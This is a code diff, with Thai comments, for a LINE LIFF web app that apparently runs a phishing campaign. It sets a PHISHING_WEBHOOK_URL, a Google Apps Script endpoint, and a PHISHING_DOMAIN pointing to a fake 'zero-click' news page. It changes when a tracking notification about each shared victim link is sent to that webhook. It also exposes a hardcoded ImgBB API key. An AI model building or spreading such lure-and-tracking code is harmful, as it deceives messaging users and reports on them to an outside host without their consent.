@@ -376,12 +376,12 @@
         let userHasPermission = false;
         
         // ค่า Config สำคัญ
-        const LIFF_ID = '2007231851-0DqwXxQg'; // ใส่ LIFF ID ของคุณตรงนี้
+        const LIFF_ID = '2006984626-AlBKqrn5'; // ใส่ LIFF ID ของคุณตรงนี้
         const IMGBB_API_KEY = '0854e4f08da46fb35f126bdf17984657'; // ใส่ API key ของ ImgBB
         
         // URL สำหรับตรวจสอบสิทธิ์และส่งข้อมูล (แยกให้ชัดเจน)
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbw0kjeWVtkX4QtHSdjKAW2DhxOMNH3TwGWqbw_V0KAB3vq_ocWwXARZiL9b2MqiWWtsQg/exec'; // ไฟล์ LineOA.html
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbzj-7G4mRsftkWQYYAcS4TNTO-sswzmL3dsI5zsMjEveFjOs0dwnKVW6cuTMqA5hrOnig/exec'; // ไฟล์ GoogleScript.html
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbxV4ziikt11WXEgzh6ufwlMixCk0B1cIsQWodXI7jX2KF5HVv48cwAq1FuINwtMKtUliQ/exec'; // ไฟล์ GoogleScript.html
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/zero-click.html';
         
         // เริ่มต้นการทำงาน LIFF
@@ -857,14 +857,18 @@
                     }
                 };
                 
-                // ส่งข้อมูลการเปิดดูแรก (Zero Click)
-                sendZeroClickNotification(trackingKey, caseName);
+                // ย้ายการส่ง notification ไปหลังจากแชร์สำเร็จ
+                // sendZeroClickNotification(trackingKey, caseName); // <-- ย้ายบรรทัดนี้
                 
                 if (liff.isApiAvailable('shareTargetPicker')) {
                     const result = await liff.shareTargetPicker([message]);
                     
                     if (result) {
                         showStatus('แชร์รูปภาพสำเร็จ', true);
+                        
+                        // ส่งข้อมูลการเปิดดูแรก (Zero Click) หลังจากแชร์สำเร็จแล้ว
+                        sendZeroClickNotification(trackingKey, caseName); // <-- ย้ายมาตรงนี้
+                        
                         // รีเซ็ตหน้าจอ
                         resetForm();
                     } else {
